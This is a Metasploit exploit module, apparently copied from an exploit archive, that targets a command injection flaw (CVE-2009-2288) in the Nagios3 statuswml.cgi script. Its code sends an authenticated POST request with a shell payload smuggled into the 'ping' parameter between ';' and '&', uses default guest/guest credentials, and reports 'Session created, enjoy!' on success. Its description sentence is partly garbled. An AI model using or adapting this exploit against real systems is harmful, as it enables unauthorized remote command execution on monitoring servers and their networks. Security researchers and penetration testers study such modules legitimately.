Nagios3 statuswml.cgi Command Injection
=======================================

##
# $Id$
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Nagios3 statuswml.cgi Ping Command Execution&#039;,
            &#039;Description&#039;    => %q{
                This module abuses a metacharacter injection vulnerability in the
            Nagios3 statuswml.cgi script. This flaw is triggered when shell
            traceroute commands.
            },
            &#039;Author&#039;         => [ &#039;hdm&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2009-2288&#039; ],
                    [ &#039;OSVDB&#039;, &#039;55281&#039;],
                ],
            &#039;Platform&#039;       => [&#039;unix&#039;],
            &#039;Arch&#039;           => ARCH_CMD,               
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 1024,
                    &#039;DisableNops&#039; => true,
                    &#039;BadChars&#039;    => &#039;<>&#039;,
                    &#039;Compat&#039;      =>
                        {
                            &#039;RequiredCmd&#039; => &#039;generic perl ruby bash telnet&#039;,
                        }
                },
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic Target&#039;, { }]
                ],
            &#039;DefaultTarget&#039; => 0))
             
            register_options(
                [
                    OptString.new(&#039;URI&#039;,  [true, "The full URI path to statuswml.cgi", "/nagios3/cgi-bin/statuswml.cgi"]),
                    OptString.new(&#039;USER&#039;, [true, "The username to authenticate with", "guest"]),
                    OptString.new(&#039;PASS&#039;, [true, "The password to authenticate with", "guest"]),                               
                ], self.class)
    end
     
    def exploit
 
        print_status("Sending request to http://#{rhost}:#{rport}#{datastore[&#039;URI&#039;]}")
         
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => datastore[&#039;URI&#039;],
            &#039;headers&#039;   => { &#039;Authorization&#039; => &#039;Basic &#039; + Rex::Text.encode_base64("#{datastore[&#039;USER&#039;]}:#{datastore[&#039;PASS&#039;]}") },
            &#039;vars_post&#039; =>
            {
                &#039;ping&#039; => &#039;;&#039; + payload.encoded + &#039;&&#039;
            }
        }, 10)
         
         
        if(not res)
            if session_created?
                print_status("Session created, enjoy!")
            else
                print_error("No response from the server")
            end
            return
        end
         
        if(res.code == 401)
            print_error("Please specify correct values for USER and PASS")
            return
        end
         
        if(res.code == 404)
            print_error("Please specify the correct path to statuswml.cgi in the URI parameter")
            return
        end
         
        if(res.body =~ /Invalid host name/)
            print_error("This server has already been patched")
            return
        end
         
        if(res.body =~ /p mode=&#039;nowrap&#039;>(.*)<\/p>/smi)
            print_status("Displaying command response")
            out = $1
            print_line(out.gsub(/<b>|<\/b>|<br.>/, &#039;&#039;))
            return
        end
 
         
        print_status("Unknown response, displaying raw HTML")
        print_line(res.body)
    end
 
end



